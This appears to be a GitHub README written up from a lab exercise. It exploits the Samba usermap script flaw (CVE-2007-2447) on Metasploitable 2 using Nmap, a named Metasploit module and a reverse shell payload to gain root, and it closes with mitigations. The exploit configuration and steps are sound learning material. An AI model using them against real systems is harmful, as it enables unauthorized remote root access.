# Samba Usermap Script Exploitation

Project Overview

This project demonstrates a penetration test conducted on a vulnerable Samba service running on a Linux target (Metasploitable 2). The objective was to identify the service version, exploit a known vulnerability (CVE-2007-2447), and gain remote root access.

Environment

    Attacker: Kali Linux

    Victim: Metasploitable 2

    Tools Used: Nmap, Metasploit Framework

Methodology

1. Reconnaissance & Enumeration

The target was scanned to identify open ports and service versions.

    Command: nmap -sV -p 139,445 <target-ip>

    Result: Port 139 and 445 were open running Samba 3.0.20-Debian.

2. Vulnerability Analysis

The identified version (Samba 3.0.20) is vulnerable to the "Username Map Script" Command Execution (CVE-2007-2447). This vulnerability allows remote attackers to execute arbitrary commands by specifying a username containing shell meta-characters.

3. Exploitation

The attack was executed using the Metasploit Framework.

Configuration:

    Exploit: exploit/multi/samba/usermap_script

    Payload: cmd/unix/reverse (Reverse TCP Shell)

    RHOSTS: Target IP

    LHOST: Attacker IP

Execution: The exploit successfully triggered a reverse connection, granting a command shell on the target system.

4. Proof of Concept

To verify high-privileged access, the user identity was checked, and a test file was created.

Verification Commands:

    whoami returned: root

    id returned: uid=0(root) gid=0(root)

<img width="666" height="457" alt="samba-usermap-script-exploitation" src="https://github.com/user-attachments/assets/6a69b900-17fb-4b7a-9306-e5b50cb3e1df" />


5. Post-Exploitation Persistence Test

A file named proof.txt was created in the /tmp directory to demonstrate write access to the filesystem.

    Command: echo "Hacked by Karin" > /tmp/proof.txt

    Verification: File ownership was confirmed as root root.

Mitigation Recommendations

To secure the system against this vulnerability:

    Update Samba to a non-vulnerable version immediately.

    Ensure the "username map script" option is disabled in smb.conf if not strictly necessary.

    Restrict access to SMB ports (139/445) via firewall rules.

## Disclaimer
This project is intended for educational purposes only. All penetration testing was conducted on a local, isolated lab environment (Metasploitable 2) 
explicitly designed to be vulnerable. The author does not condone or encourage unauthorized access to any system.
